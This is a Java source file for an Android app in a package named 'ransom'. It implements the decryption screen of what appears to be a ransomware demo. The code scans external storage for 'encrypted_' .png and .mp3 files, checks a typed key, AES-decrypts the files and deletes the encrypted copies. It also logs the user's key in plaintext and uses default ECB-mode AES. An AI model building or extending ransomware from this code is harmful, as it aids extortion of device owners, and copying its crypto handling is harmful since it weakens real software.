package com.ruturaj.android.ransom;

import android.content.Intent;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.Toast;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

public class DecryptActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_decrypt);
        Intent intent = getIntent();
        final String key = intent.getStringExtra("key");

        // Views
        ImageButton ButtonDecrypt = findViewById (R.id.meowth);

        ButtonDecrypt.setOnClickListener (new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                EditText editText = findViewById(R.id.passwordField);
                final String user_key = editText.getText().toString();
                try {

                    ArrayList<File> Files = FindArchives (Environment.getExternalStorageDirectory());
                    for (int i = 0; i <Files.size(); i++) {
                        // Check files with the index of encrypted_
                        int check = Files.get(i).getName().indexOf("encrypted_");
                        if (check != -1) {
                            // Log message
                            Log.d("ADebugTag", "Value: " + user_key);
                            // First check if the user_key is equal to key, if so - proceed to decryption
                            if (key.equals(user_key)){
                                Toast.makeText (getApplicationContext(), "Decrypting....", Toast.LENGTH_LONG).show();
                                // Decrypting....
                                decrypt(key, Files.get(i).getPath(), Files.get(i).getName());
                            }
                        }
                    }
                } catch (IOException | NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException k) {
                    k.printStackTrace();
                }
            }
        });
    }

    public void decrypt(String key, String address, String name) throws IOException , NoSuchAlgorithmException , NoSuchPaddingException, InvalidKeyException {
        File extStore = Environment.getExternalStorageDirectory();
        FileInputStream Entry = new FileInputStream ( "/" + address );
        // Save as a decrypted_ file
        FileOutputStream Output = new FileOutputStream ( extStore + "/decrypted_" + name );
        SecretKeySpec secretKeySpec;
        secretKeySpec = new SecretKeySpec( key.getBytes(),
                "AES" );
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init ( Cipher.DECRYPT_MODE , secretKeySpec );
        Toast.makeText(this, "Your files are now decrypted", Toast.LENGTH_SHORT).show();
        CipherInputStream cipherInputStream = new CipherInputStream (Entry, cipher);
        int b ;
        byte[] bytes = new byte [8];
        while (( b = cipherInputStream.read(bytes)) != -1 ) {
            Output. write ( bytes, 0 , b );
        }
        Output. flush();
        Output.close();
        cipherInputStream.close();

        File tmp = new File("/" + address );
        tmp.delete();
    }

    public static ArrayList<File> FindArchives (File root) {
        ArrayList <File> Files = new ArrayList <File> ();
        File[] files = root.listFiles();
        if (files != null) {
            for (File file: files) {
                if (file.isDirectory() &&! file.isHidden()) {

                    Files.addAll(FindArchives (file));
                } else {
                    // Checks for .png and .mp3 files
                    if (file.getName().endsWith(".png") || file.getName().endsWith(".mp3")) {
                        if (file.getTotalSpace()> 3) {
                            Files.add(file);
                        }
                    }
                }
            }
        }
        return Files;
    }
}
